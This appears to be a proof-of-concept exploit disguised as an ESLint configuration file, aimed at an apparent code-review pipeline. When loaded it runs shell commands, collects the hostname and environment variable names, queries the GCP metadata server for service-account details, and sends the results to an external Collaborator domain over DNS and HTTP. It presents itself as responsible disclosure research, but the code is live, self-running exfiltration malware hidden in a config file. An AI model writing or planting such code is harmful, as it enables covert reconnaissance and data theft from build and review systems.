// CodeRabbit review-pipeline RCE — BLAST-RADIUS proof (responsible).
// Proves: (1) code-exec context, (2) secret PRESENCE (env var NAMES, not values),
// (3) GCP metadata REACHABILITY (SA email + scopes — NOT the usable access token).
// Replace <COLLAB> with a FRESH Burp Collaborator / interactsh domain before pushing.
var C = 'rjeb8z763etubeyjasyg7giluc03oucj.oastify.com';
var http = require('http'), dns = require('dns');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };

// small fields -> DNS beacon (label <= 60 chars)
var dnsBeacon = function (tag, data) {
  try { dns.lookup((tag + '-' + hex(data)).slice(0, 60) + '.' + C, function () {}); } catch (e) {}
};
// larger fields -> HTTP exfil (Collaborator captures the full request path)
var httpExfil = function (tag, data) {
  try { http.get({ host: C, path: '/' + tag + '/' + hex(data).slice(0, 1500), timeout: 4000 }, function () {}).on('error', function () {}); } catch (e) {}
};

// (1) execution context — benign identity
try { dnsBeacon('id', require('child_process').execSync('id', { timeout: 6000 }).toString().trim()); } catch (e) { dnsBeacon('id', 'NOEXEC'); }
try { dnsBeacon('host', require('os').hostname()); } catch (e) {}

// (2) secret PRESENCE — env var NAMES only, never values
try { httpExfil('envnames', Object.keys(process.env).sort().join(',')); } catch (e) {}

// (3) GCP metadata REACHABILITY — SA email + scopes prove takeover potential.
//     The access TOKEN is deliberately NOT fetched (responsible PoC).
var md = function (path, tag) {
  try {
    http.get({ host: 'metadata.google.internal', path: path, headers: { 'Metadata-Flavor': 'Google' }, timeout: 4000 },
      function (r) { var b = ''; r.on('data', function (d) { b += d; }); r.on('end', function () { httpExfil(tag, 'HTTP' + r.statusCode + ':' + b.slice(0, 300)); }); })
      .on('error', function (e) { dnsBeacon(tag + 'err', (e && e.code) || 'err'); });
  } catch (e) { dnsBeacon(tag + 'exc', '1'); }
};
md('/computeMetadata/v1/instance/service-accounts/default/email', 'mdsa');
md('/computeMetadata/v1/instance/service-accounts/default/scopes', 'mdscope');
md('/computeMetadata/v1/project/project-id', 'mdproj');

module.exports = { root: true, rules: {} };
